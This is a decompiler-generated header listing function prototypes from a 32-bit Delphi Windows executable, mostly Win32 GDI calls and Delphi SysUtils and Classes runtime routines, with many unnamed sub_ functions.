// DWORD __stdcall WNetOpenEnumA(DWORD dwScope, DWORD dwType, DWORD dwUsage, LPNETRESOURCEA lpNetResource, LPHANDLE lphEnum);
// HBITMAP __stdcall CreateBitmap(int nWidth, int nHeight, UINT nPlanes, UINT nBitCount, const void *lpBits);
// HBRUSH __stdcall CreateBrushIndirect(const LOGBRUSH *plbrush);
// HBITMAP __stdcall CreateCompatibleBitmap(HDC hdc, int cx, int cy);
// HDC __stdcall CreateCompatibleDC(HDC hdc);
// HBITMAP __stdcall CreateDIBitmap(HDC hdc, const BITMAPINFOHEADER *pbmih, DWORD flInit, const void *pjBits, const BITMAPINFO *pbmi, UINT iUsage);
// HFONT __stdcall CreateFontIndirectA(const LOGFONTA *lplf);
// HPALETTE __stdcall CreatePalette(const LOGPALETTE *plpal);
// HPEN __stdcall CreatePenIndirect(const LOGPEN *plpen);
// BOOL __stdcall DeleteDC(HDC hdc);
// BOOL __stdcall DeleteObject(HGDIOBJ ho);
// LONG __stdcall GetBitmapBits(HBITMAP hbit, LONG cb, LPVOID lpvBits);
// BOOL __stdcall GetCurrentPositionEx(HDC hdc, LPPOINT lppt);
// int __stdcall GetDIBits(HDC hdc, HBITMAP hbm, UINT start, UINT cLines, LPVOID lpvBits, LPBITMAPINFO lpbmi, UINT usage);
// int __stdcall GetDeviceCaps(HDC hdc, int index);
// int __stdcall GetObjectA(HANDLE h, int c, LPVOID pv);
// HGDIOBJ __stdcall GetStockObject(int i);
// UINT __stdcall GetSystemPaletteEntries(HDC hdc, UINT iStart, UINT cEntries, LPPALETTEENTRY pPalEntries);
// BOOL __stdcall GetTextMetricsA(HDC hdc, LPTEXTMETRICA lptm);
// BOOL __stdcall MoveToEx(HDC hdc, int x, int y, LPPOINT lppt);
// UINT __stdcall RealizePalette(HDC hdc);
// HGDIOBJ __stdcall SelectObject(HDC hdc, HGDIOBJ h);
// HPALETTE __stdcall SelectPalette(HDC hdc, HPALETTE hPal, BOOL bForceBkgd);
// COLORREF __stdcall SetBkColor(HDC hdc, COLORREF color);
// int __stdcall SetBkMode(HDC hdc, int mode);
// int __stdcall SetROP2(HDC hdc, int rop2);
// COLORREF __stdcall SetTextColor(HDC hdc, COLORREF color);
// BOOL __stdcall StretchBlt(HDC hdcDest, int xDest, int yDest, int wDest, int hDest, HDC hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, DWORD rop);
// BOOL __stdcall UnrealizeObject(HGDIOBJ h);
// HICON __stdcall CreateIcon(HINSTANCE hInstance, int nWidth, int nHeight, BYTE cPlanes, BYTE cBitsPixel, const BYTE *lpbANDbits, const BYTE *lpbXORbits);
// BOOL __stdcall DestroyIcon(HICON hIcon);
// BOOL __stdcall DestroyWindow(HWND hWnd);
// BOOL __stdcall DrawIconEx(HDC hdc, int xLeft, int yTop, HICON hIcon, int cxWidth, int cyWidth, UINT istepIfAniCur, HBRUSH hbrFlickerFreeDraw, UINT diFlags);
// HDC __stdcall GetDC(HWND hWnd);
// BOOL __stdcall GetIconInfo(HICON hIcon, PICONINFO piconinfo);
// DWORD __stdcall GetSysColor(int nIndex);
// int __stdcall GetSystemMetrics(int nIndex);
// HICON __stdcall LoadIconA(HINSTANCE hInstance, LPCSTR lpIconName);
// int __stdcall LoadStringA_0(HINSTANCE hInstance, UINT uID, LPSTR lpBuffer, int cchBufferMax);
// int __stdcall MessageBoxA_0(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
// int __stdcall ReleaseDC(HWND hWnd, HDC hDC);
// LPVOID __usercall sub_405E7C@<eax>(UINT a1@<eax>, SIZE_T a2@<edx>);
// LPVOID __usercall sub_405E8C@<eax>(UINT uFlags@<ecx>, SIZE_T dwBytes@<edx>, const void *a3@<eax>);
// HGLOBAL __usercall sub_405EA8@<eax>(const void *a1@<eax>);
int Finalization_0_7_0();
void sub_405EEC();
int Finalization_0_7_1();
void sub_4061BC();
// unsigned int __userpurge sub_406CA0@<eax>(unsigned int result@<eax>, unsigned __int16 a2@<dx>, _WORD *a3@<ecx>, _WORD *a4);
void __fastcall sub_406CBC(int a1, void *a2);
// void __usercall SysUtils::_16482(int a1@<eax>);
// char *__usercall sub_406D34@<eax>(int a1@<eax>);
// int __usercall Sysutils::UpperCase@<eax>(int a1@<eax>, BYTE **a2@<edx>);
// int __usercall Sysutils::LowerCase@<eax>(int a1@<eax>, BYTE **a2@<edx>);
// int __usercall sub_406DCC@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edx>, unsigned int a3@<ecx>);
// int __usercall Sysutils::CompareText@<eax>(_BYTE *a1@<eax>, _BYTE *a2@<edx>);
// char __usercall Sysutils::SameText@<al>(_BYTE *a1@<eax>, _BYTE *a2@<edx>);
// int __usercall DumbItDownFor95@<eax>(char *a1@<eax>, char *a2@<edx>);
// void __usercall Sysutils::Trim(char *a1@<eax>, char **a2@<edx>);
// void __usercall Sysutils::TrimRight(char *a1@<eax>, char **a2@<edx>);
// int __usercall Sysutils::AdjustLineBreaks@<eax>(int a1@<eax>, BYTE **a2@<edx>);
int __fastcall Sysutils::IntToStr(int a2, LStr *a1);
// void __usercall Sysutils::IntToHex(int a1@<ecx>, int a2@<edx>, int a3@<eax>);
// int __usercall sub_407058@<eax>(int a1@<eax>, int a2@<edx>, char *a3@<ecx>);
// HANDLE __usercall FileOpen@<eax>(char *a1@<eax>, char a2@<dl>);
// HANDLE __usercall Sysutils::FileCreate@<eax>(char *a1@<eax>);
// DWORD __usercall FileRead@<eax>(DWORD nNumberOfBytesToRead@<ecx>, LPVOID lpBuffer@<edx>, void *a3@<eax>);
// DWORD __usercall FileRead_0@<eax>(DWORD nNumberOfBytesToRead@<ecx>, LPVOID lpBuffer@<edx>, void *a3@<eax>);
// DWORD __usercall sub_40712C@<eax>(DWORD dwMoveMethod@<ecx>, LONG lDistanceToMove@<edx>, void *a3@<eax>);
// BOOL __usercall sub_407138@<eax>(void *a1@<eax>);
// int __usercall Sysutils::FileAge@<eax>(char *a1@<eax>);
// bool __usercall sub_4071A8@<al>(char *a1@<eax>);
// DWORD __usercall Sysutils::FileSetAttr@<eax>(DWORD a1@<edx>, char *a2@<eax>);
// DWORD __usercall SysUtils::_16594@<eax>(int a1@<eax>);
// DWORD __usercall Sysutils::FindFirst@<eax>(char *a1@<eax>, char a2@<dl>, int a3@<ecx>);
// DWORD __usercall Sysutils::FindNext@<eax>(int a1@<eax>);
// void *__usercall sub_4072B8@<eax>(int a1@<eax>);
// int __usercall Sysutils::LastDelimiter@<eax>(char *a1@<eax>, char *a2@<edx>);
// void __usercall Sysutils::ChangeFileExt(char *a1@<eax>, char *a2@<edx>, BYTE **a3@<ecx>);
// void __usercall Sysutils::ExtractFilePath(char *a1@<eax>, char **a2@<edx>);
// void __usercall Sysutils::ExtractFileName(char *a1@<eax>, char **a2@<edx>);
// void __usercall Sysutils::ExtractShortPathName(char *a1@<eax>, BYTE **a2@<edx>);
BOOL __stdcall System::Sysutils::_16913(LPCSTR lpRootPathName, int a2, int a3, int a4);
// int __usercall SysUtils::_16646@<eax>(char a1@<al>, int a2@<edx>, int a3@<ecx>);
// __int64 __usercall Sysutils::DiskFree@<edx:eax>(char a1@<al>);
// unsigned int __usercall sub_407534@<eax>(const char *a1@<eax>);
// char *__usercall Sysutils::StrMove@<eax>(char *a1@<ecx>, const char *a2@<edx>, char *result@<eax>);
// char *__usercall Sysutils::StrLCopy@<eax>(char *a1@<ecx>, const char *a2@<edx>, char *result@<eax>);
// char *__usercall StrPCopy@<eax>(char *a1@<eax>, char *a2@<edx>);
// int __usercall Sysutils::StrLIComp@<eax>(const char *a1@<ecx>, const char *a2@<edx>, _BYTE *a3@<eax>);
// _BYTE *__usercall Sysutils::StrScan@<eax>(char a1@<dl>, _BYTE *a2@<eax>);
// _DWORD *__usercall sub_407648@<eax>(int a1@<eax>);
// char *__usercall Tntwidestrutils::WStrNew@<eax>(const char *a1@<eax>);
// void __usercall Ansistrings::_16395(int a1@<eax>, unsigned __int8 *a2@<edx>, unsigned int a3@<ecx>);
// void __usercall sub_4076E0(char **a1@<eax>, VARIANTARG *a2@<edx>);
void __thiscall sub_4076F4(LStr *this);
// _BYTE *__userpurge Sysutils::FormatBuf@<eax>(unsigned __int8 *a1@<eax>, unsigned int a2@<edx>, unsigned __int8 *a3@<ecx>, int a4, int a5, int a6);
// unsigned __int8 __usercall sub_4077E2@<al>(unsigned __int8 result@<al>, unsigned __int8 *a2@<ecx>, int a3@<ebp>, unsigned __int8 *a4@<esi>);
// void __usercall sub_40782B(char a1@<al>, LStr *a2@<ecx>, int a3@<ebp>, void (__usercall *a4)(BYTE **a1@<eax>, int a2@<edx>)@<esi>);
// int __usercall sub_4078EB@<eax>(unsigned __int64 *a1@<ebx>, int a2@<ebp>);
// unsigned int __usercall sub_407972@<eax>(unsigned int result@<eax>, int a2@<ebp>);
void __thiscall __spoils<edx,ecx> sub_407ADD(LStr *this);
// unsigned __int8 *__userpurge Sysutils::StrLFmt@<eax>(int a1@<ecx>, int a2@<edx>, unsigned __int8 *a3@<eax>, char *a4, int a5, int a6);
// void __userpurge sub_407B2C(unsigned __int8 *a1@<eax>, int a2@<edx>, int a3@<ecx>, BYTE **a4);
// void __userpurge FmtStr(BYTE **a1@<eax>, unsigned __int8 *a2@<edx>, int a3@<ecx>, int a4);
// int __userpurge Sysutils::DateTimeToTimeStamp@<eax>(_DWORD *a1@<eax>, double a2);
// char __userpurge Sysutils::TryEncodeTime@<al>(unsigned __int16 a1@<ax>, unsigned __int16 a2@<dx>, unsigned __int16 a3@<cx>, double *a4, unsigned __int16 a5);
// double __userpurge Sysutils::EncodeTime@<st0>(unsigned __int16 a1@<cx>, unsigned __int16 a2@<dx>, unsigned __int16 a3@<ax>, unsigned __int16 a4, unsigned __int16 a5);
// unsigned int __userpurge Sysutils::DecodeTime@<eax>(_WORD *a1@<eax>, _WORD *a2@<edx>, _WORD *a3@<ecx>, int a4, double a5);
// bool __usercall Sysutils::IsLeapYear@<al>(unsigned __int16 a1@<ax>);
// char __userpurge Sysutils::TryEncodeDate@<al>(unsigned __int16 a1@<ax>, unsigned __int16 a2@<dx>, unsigned __int16 a3@<cx>, double *a4);
// double __usercall Sysutils::EncodeDate@<st0>(unsigned __int16 a1@<cx>, unsigned __int16 a2@<ax>, unsigned __int16 a3@<dx>);
// _WORD *__userpurge SysUtils::_16631@<eax>(unsigned __int16 *a1@<eax>, _WORD *a2@<edx>, _WORD *a3@<ecx>, int a4, double a5);
// _WORD *__userpurge sub_408048@<eax>(unsigned __int16 *a1@<eax>, _WORD *a2@<edx>, _WORD *a3@<ecx>, double a4);
int __stdcall Sysutils::DayOfWeek(double); // idb
// long double __usercall Sysutils::Now@<st0>();
// int __usercall SysUtils::_16643@<eax>(BYTE *a1@<eax>, int a2@<edx>, int a3);
// int __usercall sub_408124@<eax>(BYTE *a1@<eax>, int a2);
// int __usercall SysUtils::_16646_0@<eax>(int a1@<eax>, int a2@<edx>, int a3);
int __cdecl SysUtils::_16719(int a1);
int __cdecl SysUtils::_16648(int a1);
int __cdecl SysUtils::_16649(int a1);
// void __usercall sub_408234(int a1@<eax>, BYTE **a2@<edx>, int a3);
// void __usercall SysUtils::_16651(int a1@<eax>, BYTE **a2@<edx>, int a3);
// void __usercall sub_4084A8(BYTE *a1@<eax>, int a2);
// int __userpurge Sysutils::DateTimeToString@<eax>(int a1@<eax>, int a2@<edx>);
// int __userpurge sub_408C78@<eax>(int a1@<eax>, int a2, int a3);
// int __userpurge sub_408C8C@<eax>(int a1@<eax>, int a2@<edx>, int a3, int a4);
// void __usercall SysErrorMessage(DWORD a1@<eax>, BYTE **a2@<edx>);
// void __userpurge Sysutils::GetLocaleStr(LCID Locale@<ecx>, LCTYPE LCType@<edx>, LCID a3@<eax>, const int System::AnsiString);
// int __usercall Sysutils::GetLocaleChar@<eax>(LCID Locale@<ecx>, LCTYPE LCType@<edx>, LCID a3@<eax>);
// void __userpurge SysUtils::_16679(LCTYPE LCType@<ecx>, int a2@<edx>, LCTYPE a3@<eax>, int a4, int a5, int a6);
// void __usercall SysUtils::_16680_0(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
BOOL __stdcall SysUtils::_16681(LPSTR); // idb
BOOL __stdcall SysUtils::_16682(LPSTR); // idb
void Sysutils::_16951();
// void __usercall SysUtils::_16684(char *a1@<eax>, BYTE **a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>);
// int __usercall sub_409244@<eax>(int result@<eax>);
// unsigned int __userpurge Sysutils::ExceptionErrorMessage@<eax>(System::TObject *a1@<ecx>, LPCVOID lpAddress@<edx>, int a3@<eax>, char *a4, int a5);
// int __usercall Sysutils::ShowException@<eax>(void *a1@<edx>, int a2@<eax>);
// void __usercall Exception_Create(void *Exception_Self@<eax>, void *string_Msg@<edx>);
// void __usercall Exception_CreateFmt(void *Exception_Self@<eax>, void *string_Msg@<edx>, void *TVarRec_Args@<ecx>);
// void __usercall Exception_CreateRes_0(void *Exception_Self@<eax>, void *PResStringRec_ResStringRec@<edx>);
// void __usercall Sysutils::Exception::Exception(void *Exception_Self@<eax>, void *NativeUInt_Ident@<edx>, void *TVarRec_Args@<ecx>);
// int __usercall sub_4095DC@<eax>(int result@<eax>);
int SysUtils::_16709();
// void __userpurge SysUtils::_16713(int a1@<eax>, DWORD a2, DWORD a3, DWORD a4, const ULONG_PTR *a5);
// int __usercall SysUtils::_16714@<eax>(char *a1@<eax>, int a2@<edx>, int a3@<ecx>);
void __stdcall sub_409778(DWORD a1, DWORD a2, DWORD a3, const ULONG_PTR *a4);
// void __userpurge sub_409788(char *a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4);
int __fastcall SysUtils::_16717(int a1, void *a2);
// char __usercall SysUtils::_16718@<al>(int *a1@<eax>);
// int __usercall sub_409850@<eax>(int *a1@<eax>);
int __cdecl SysUtils::_16720(int a1);
// int *__usercall SysUtils::_16706@<eax>(int *a1@<eax>);
// void __usercall __noreturn sub_409AFC(int a1@<eax>, void *a2@<edx>);
void SysUtils::_16723();
void *SysUtils::_16801();
void SysUtils::_16802();
// int __usercall SysUtils::_16727@<eax>(unsigned __int8 *a1@<eax>, int a2@<edx>);
// int __usercall Sysutils::ByteType@<eax>(int a1@<edx>, char *a2@<eax>);
// int __usercall sub_409D38@<eax>(unsigned __int8 *a1@<eax>, int a2@<edx>);
// int __usercall Sysutils::ByteToCharLen@<eax>(int a1@<edx>, int a2@<eax>);
// int __usercall sub_409D78@<eax>(int a1@<eax>, int a2@<edx>);
// int __userpurge sub_409DC8@<eax>(int a1@<eax>, int a2@<edx>, int *a3@<ecx>, int *a4);
// __int64 __usercall Sysutils::CharToByteIndex@<edx:eax>(int a1@<edx>, int a2@<eax>);
// __int64 __usercall Sysutils::CharToByteLen@<edx:eax>(int a1@<edx>, int a2@<eax>);
// _BYTE *__usercall Sysutils::AnsiStrRScan@<eax>(char a1@<dl>, unsigned __int8 *a2@<eax>);
// _BYTE *__usercall Sysutils::AnsiStrScan@<eax>(char a1@<dl>, unsigned __int8 *a2@<eax>);
char SysUtils::_16746();
// void __usercall Sysutils::GetFormatSettings(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
void __cdecl Sysutils::RaiseLastWin32Error();
// int __usercall sub_40A430@<eax>(int a1@<eax>);
int sub_40A440();
HMODULE SysUtils::_16779();
// char *__usercall TMultiReadExclusiveWriteSynchronizer__bctr@<eax>(char *a1@<eax>, char a2@<dl>);
// void __usercall Sysutils::TMultiReadExclusiveWriteSynchronizer::~TMultiReadExclusiveWriteSynchronizer(_DWORD *a1@<eax>, char a2@<dl>);
// bool __usercall TMultiReadExclusiveWriteSynchronizer::WriterIsOnlyReader@<al>(int a1@<eax>);
// void __usercall Sysutils::TMultiReadExclusiveWriteSynchronizer::BeginWrite(int a1@<eax>);
// _DWORD *__usercall sub_40A5EC@<eax>(_DWORD **a1@<eax>);
// int __userpurge sub_40A8E8@<eax>(_BYTE *eax0@<eax>, int edx0@<edx>, char cl0@<cl>, int a1, int a2, char a3);
// int __userpurge FLOATTOTEXT@<eax>(_BYTE *a1@<eax>, int a2@<edx>, char a3@<cl>, int a4, int a5, unsigned __int8 a6);
// char __usercall sub_40A9A3@<al>(char *a1@<esi>);
// char __usercall sub_40A9AC@<al>(int a1@<ebp>, _BYTE *a2@<edi>);
// char __usercall sub_40A9B6@<al>(int a1@<ebp>, _BYTE *a2@<edi>, char *a3@<esi>);
// int __usercall sub_40AA18@<eax>(int a1@<ebp>, _BYTE *a2@<edi>, char *a3@<esi>);
// int __usercall sub_40AA4C@<eax>(__int16 a1@<ax>, int a2@<edx>, int a3@<ecx>, char a4@<bl>, _BYTE *a5@<edi>);
// char __usercall sub_40AA90@<al>(int a1@<ebp>, char *a2@<edi>, char *a3@<esi>);
// void __usercall sub_40AAF1(int a1@<ebp>, _BYTE *a2@<edi>, char *a3@<esi>);
// void __usercall sub_40AB48(void *a1@<edi>);
// _BYTE *__userpurge sub_40AB5A@<eax>(int a1@<eax>, int a2@<edx>, _BYTE *a3@<ecx>, int a4@<ebp>, char *a5@<esi>, int a6);
// char __usercall sub_40AC8A@<al>(int a1@<ecx>, int a2@<ebp>);
// int __usercall sub_40ACC5@<eax>(int a1@<ebp>, char *a2@<esi>);
// _BYTE *__usercall sub_40AD70@<eax>(int a1@<ebp>);
// char __usercall sub_40AE2B@<al>(_BYTE *a1@<ebx>, int a2@<ebp>, _BYTE *a3@<edi>);
// char __usercall sub_40AE4C@<al>(_BYTE *a1@<ebx>, int a2@<ebp>, _BYTE *a3@<edi>);
// _BYTE *__userpurge FLOATTODECIMAL@<eax>(int a1@<eax>, int a2@<edx>, char a3@<cl>, int a4, int a5);
// int __usercall sub_40AEB8@<eax>(int a1@<eax>, int a2@<ecx>, int a3@<ebx>, int a4@<ebp>, int a5@<esi>);
// _BYTE *__usercall sub_40AFBF@<eax>(int a1@<ebx>, int a2@<ebp>, int a3@<esi>);
// char __usercall sub_40B13B@<al>(char *a1@<esi>);
// double __usercall sub_40B146@<st0>(int a1@<ebp>, char *a2@<esi>, double result@<st0>);
// char __usercall sub_40B162@<al>(_BYTE *a1@<esi>);
int __cdecl Sysutils::Finalization();
// int __usercall Sysutils::initialization@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
int Finalization_0_7_2();
void sub_40B384();
int Finalization_0_7_3();
void sub_40B3BC();
int Finalization_0_7_4();
void sub_40B4A4();
int __fastcall Typinfo::Finalization(Typinfo *this);
void sub_40B528();
// void __usercall Classes::UnRegisterModuleClasses(PVOID a1@<eax>);
// _DWORD *__userpurge Classes::_16548@<eax>(_DWORD *result@<eax>, char a2@<dl>, int a3@<ecx>, int a4, int a5);
// void __usercall Classes::RegisterIntegerConsts(void *a1@<ecx>, bool (__fastcall __high *a2)(const System::AnsiString, int *)@<edx>, int a3@<eax>);
// char __userpurge Classes::IdentToInt@<al>(_BYTE *a1@<eax>, _DWORD *a2@<edx>, int a3@<ecx>, int a4);
// char __userpurge Classes::IntToIdent@<al>(int a1@<eax>, char **a2@<edx>, int a3@<ecx>, int a4);
// void __usercall TList_Destroy(void *TList_Self@<eax>);
// int __usercall Classes::TList::Add@<eax>(Classes::TList *this@<ecx>, void *a2@<edx>, _DWORD *a3@<eax>);
// void __usercall sub_40C104(_DWORD *a1@<eax>);
// int __usercall Classes::TList::Delete@<eax>(int a1@<edx>, _DWORD *a2@<eax>);
// int __usercall sub_40C17C@<eax>(int a1@<ebp>);
// void __userpurge sub_40C180(void *a1@<edx>, int a2@<ebp>, DWORD a3, DWORD a4, DWORD a5, const ULONG_PTR *a6);
void __fastcall Classes::TList::Error(int a1, int a2);
// int __usercall Classes::TList::Get@<eax>(int a1@<edx>, int a2@<eax>);
// int __usercall sub_40C268@<eax>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_40C288@<eax>(_DWORD *a1@<eax>, int a2@<edx>);
// void __usercall TList::SetCapacity(int self@<eax>, int capacity@<edx>);
// __int16 __usercall Classes::TList::SetCount@<ax>(int a1@<edx>, _DWORD *a2@<eax>);
// char *__usercall Classes::TThreadList::TThreadList@<eax>(char *a1@<eax>, char a2@<dl>);
// void __usercall TThreadList::~TThreadList(_DWORD *a1@<eax>, char a2@<dl>);
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
// void __usercall Classes::TThreadList::Add(void *a1@<edx>, int a2@<eax>);
// int __usercall sub_40C4B0@<eax>(int a1@<eax>);
// void __usercall Classes::TThreadList::Remove(void *a1@<edx>, int a2@<eax>);
// void __usercall sub_40C514(int a1@<eax>);
// void __usercall TStored_Destroy_7(int self@<eax>);
// void __usercall sub_40C54C(int *a1@<eax>, void (***a2)(void)@<edx>);
// void __usercall Classes::TPersistent::AssignError(int *a1@<eax>, int *a2@<edx>);
// void __usercall Classes::TPersistent::GetNamePath(int *a1@<eax>, BYTE **a2@<edx>);
// void __usercall Cxtl::TcxTreeListCustomizing::~TcxTreeListCustomizing(_DWORD *a1@<eax>, char a2@<dl>);
// int __usercall Classes::TStrings::Add@<eax>(Classes::TStrings *this@<ecx>, int System::AnsiString@<edx>, int a3@<eax>);
// int __usercall Classes::TStrings::AddObject@<eax>(int a1@<eax>, int a2@<ecx>);
// void __usercall TStrings::AddStrings(_DWORD *a1@<eax>, int a2@<edx>);
// void __usercall Classes::TStrings::Assign(Classes::TPersistent *a1@<edx>, int *a2@<eax>);
// _DWORD *__usercall sub_40C890@<eax>(_DWORD *result@<eax>);
// int __usercall Classes::_16681@<eax>(int a1@<ebx>, int a2);
// int __usercall Controls::TControl::DefineProperties@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ebx>);
// _DWORD *__usercall sub_40C94C@<eax>(_DWORD *result@<eax>);
// char __usercall Classes::TStrings::Equals@<al>(Classes::TStrings *a1@<edx>, int a2@<eax>);
// int __usercall sub_40CA08@<eax>(int a1@<ebp>);
// void __userpurge sub_40CA0C(void *a1@<edx>, int a2@<ebp>, DWORD a3, DWORD a4, DWORD a5, const ULONG_PTR *a6);
void __fastcall Tntwidestrings::TWideStrings::Error(int a1, int a2);
// void __usercall Classes::TStrings::Exchange(Classes::TStrings *this@<ecx>, int a2@<edx>, _DWORD *a3@<eax>);
// int __usercall sub_40CB84@<eax>(int a1@<eax>);
int sub_40CB8C();
// void __usercall TStrings_GetText(void *TStrings_Self@<eax>);
// void __usercall TStrings::GetTextStr(int a1@<eax>, BYTE **a2@<edx>);
// int __usercall Classes::TStrings::IndexOf@<eax>(char *System::AnsiString@<edx>, int a2@<eax>);
// int __userpurge Classes::TStrings::InsertObject@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4);
// _DWORD *__usercall Classes::TStrings::LoadFromFile@<eax>(Classes::TFileStream *System::AnsiString@<edx>, int a2@<eax>);
// void __usercall TStrings::LoadFromStream(_DWORD *a1@<eax>, int a2@<edx>);
// void __usercall Classes::TStrings::Move(Classes::TStrings *this@<ecx>, _DWORD *a2@<eax>, Classes::TStrings *a3@<edx>);
// int __usercall Classes::TStrings::Put@<eax>(Classes::TStrings *this@<ecx>, int a2@<eax>, int a3@<edx>);
// void __usercall Idmultipartformdata::TIdFormDataField::SetContentType(_DWORD *System::AnsiString@<edx>, _DWORD *a2@<eax>);
// _DWORD *__usercall Classes::TStrings::SaveToFile@<eax>(Classes::TFileStream *System::AnsiString@<edx>, int a2@<eax>);
// void __usercall Classes::TStrings::SaveToStream(Classes::TStream *a1@<edx>, int a2@<eax>, int a3@<esi>);
// int *__usercall Classes::TStrings::SetStringsAdapter@<eax>(int a1@<eax>, int a2@<edx>);
// void __usercall Classes::TStrings::SetText(const wchar_t *a1@<edx>, int a2@<eax>);
// void __usercall TStrings::SetTextStr(const int AnsiString@<edx>, _DWORD *a2@<eax>);
// void __usercall Tntwidestrings::TWideStrings::WriteData(TWriter *a1@<edx>, int a2@<eax>);
// int __usercall Classes::TStringList::~TStringList@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// Classes::TStringList *__usercall Classes::TStringList::Add@<eax>(Classes::TStringList *this@<ecx>, Classes::TStringList *System::AnsiString@<edx>, int a3@<eax>);
// int __usercall sub_40D348@<eax>(int result@<eax>, int a2@<ecx>);
// int __usercall sub_40D364@<eax>(int result@<eax>, int a2@<ecx>);
// _DWORD *__usercall Classes::TStringList::Clear@<eax>(Classes::TStringList *this@<ecx>, _DWORD *result@<eax>);
// int __usercall Classes::TStringList::Delete@<eax>(Classes::TStringList *this@<ecx>, int a2@<edx>, _DWORD *a3@<eax>);
// int __usercall Classes::TStringList::Exchange@<eax>(Classes::TStringList *this@<ecx>, int a2@<edx>, _DWORD *a3@<eax>);
// int *__usercall Classes::TStringList::ExchangeItems@<eax>(Classes::TStringList *this@<ecx>, int a2@<edx>, int a3@<eax>);
// char __usercall TStringList::Find@<al>(int a1@<eax>, char *a2@<edx>, signed int *a3@<ecx>);
// void __usercall Classes::TStringList::Get(Classes::TStringList *this@<ecx>, int a2@<edx>, int a3@<eax>);
// int __usercall sub_40D534@<eax>(int a1@<eax>);
// int __usercall sub_40D538@<eax>(int a1@<eax>);
// int __usercall Classes::TStringList::GetObject@<eax>(int a1@<edx>, int a2@<eax>);
// int __usercall Classes::TStringList::Grow@<eax>(int a1@<eax>);
// int __usercall Classes::TStringList::IndexOf@<eax>(Classes::TStringList *this@<ecx>, char *System::AnsiString@<edx>, _BYTE *a3@<eax>);
// int __usercall Classes::TStringList::Insert@<eax>(Classes::TStringList *this@<ecx>, int a2@<eax>, int a3@<edx>);
// int __usercall Classes::TStringList::InsertItem@<eax>(Classes::TStringList *this@<ecx>, _DWORD *a2@<eax>, int a3@<edx>);
// int __usercall Classes::TStringList::Put@<eax>(Classes::TStringList *this@<ecx>, int a2@<eax>, int a3@<edx>);
// int __usercall Classes::TStringList::PutObject@<eax>(Classes::TStringList *this@<ecx>, int a2@<edx>, _DWORD *a3@<eax>);
// int *__userpurge Tntclasses::TTntStringList::QuickSort@<eax>(Tntclasses::TTntStringList *this@<ecx>, int a2@<edx>, int a3@<eax>, int a4, int (__fastcall *a5)(Tntclasses::TTntStringList *, int, int));
// void __usercall sub_40D7A8(int a1@<eax>, int a2@<edx>);
// int __usercall sub_40D7C4@<eax>(int a1@<eax>, char a2@<dl>);
// int __usercall sub_40D7D4@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall sub_40D7EC@<eax>(int a1@<eax>);
// int __usercall Classes::TStringList::CustomSort@<eax>(Classes::TStringList *this@<ecx>, int (__fastcall *a2)(Classes::TStringList *, int, int)@<edx>, int result@<eax>);
// int __usercall sub_40D830@<eax>(int a1@<eax>);
// int __usercall sub_40D840@<eax>(int a1@<eax>);
// int __usercall Classes::TStream::GetSize@<eax>(int a1@<eax>);
// int __usercall TStream::ReadBuffer@<eax>(int self@<eax>, void *a2@<edx>, int result@<ecx>);
// void __usercall Classes::TStream::WriteBuffer(Classes::TStream *this@<ecx>, const void *a2@<edx>, int a3@<eax>);
// DWORD __usercall sub_40D8F4@<eax>(int a1@<eax>, void *a2@<edx>, DWORD a3@<ecx>);
// DWORD __usercall sub_40D904@<eax>(int a1@<eax>, void *a2@<edx>, DWORD a3@<ecx>);
// DWORD __usercall sub_40D914@<eax>(int a1@<eax>, LONG a2@<edx>, unsigned __int16 a3@<cx>);
// int __usercall sub_40D920@<eax>(HANDLE *a1@<eax>);
// _DWORD *__userpurge Classes::TFileStream::TFileStream@<eax>(Classes::TFileStream *this@<ecx>, char System::AnsiString@<dl>, int a3@<eax>, unsigned __int16 a4);
// void __usercall TFileStream::`...'(_DWORD *a1@<eax>, char a2@<dl>);
// int __usercall sub_40DA20@<eax>(int result@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall Classes::TCustomMemoryStream::Read@<eax>(Classes::TCustomMemoryStream *this@<ecx>, void *a2@<edx>, _DWORD *a3@<eax>);
// int __usercall TCustomMemoryStream::Seek@<eax>(TCustomMemoryStream *this@<ecx>, int a2@<edx>, int a3@<eax>);
// void __usercall TStored_Destroy_7_0(int self@<eax>);
// int __usercall sub_40DAB0@<eax>(int *a1@<eax>);
// int __usercall sub_40DAC8@<eax>(int a1@<eax>, int a2@<edx>);
// void __usercall TMemoryStream_LoadFromFile(void *TMemoryStream_Self@<eax>, void *string_FileName@<edx>);
// int __usercall Classes::TMemoryStream::SetCapacity@<eax>(int *a1@<eax>);
// int __usercall Classes::TMemoryStream::SetSize@<eax>(int a1@<edx>, int *a2@<eax>);
_DWORD __fastcall Classes::TMemoryStream::Realloc(Classes::TMemoryStream *__hidden this, int *); // idb
// Classes::TMemoryStream *__usercall Classes::TMemoryStream::Write@<eax>(Classes::TMemoryStream *this@<ecx>, const void *a2@<edx>, int *a3@<eax>);
// void __usercall Classes::RemoveFixupReferences(const int System::AnsiString@<edx>, int a2@<eax>);
// void __usercall Classes::RemoveFixups(int a1@<eax>);
void __fastcall sub_40DDAC(int a1, void *a2);
void __fastcall sub_40DDC4(int a1, void *a2);
// void __usercall Classes::TReader::CheckValue(_DWORD *a1@<eax>, char a2@<dl>, int a3@<ecx>);
// bool __usercall sub_40DDF4@<al>(_DWORD *a1@<eax>, int a2@<ecx>);
// __int64 __usercall sub_40DE08@<edx:eax>(_DWORD *a1@<eax>, int a2@<ecx>);
// _DWORD *__usercall TReader::Read@<eax>(TReader *this@<ecx>, void *a2@<edx>, _DWORD *result@<eax>);
// int __usercall Classes::TReader::ReadBuffer@<eax>(int a1@<eax>);
// void __usercall sub_40DEA0(_DWORD *a1@<eax>, int a2@<ecx>);
// void __usercall sub_40DEA8(void *this@<ecx>, _DWORD *a2@<eax>);
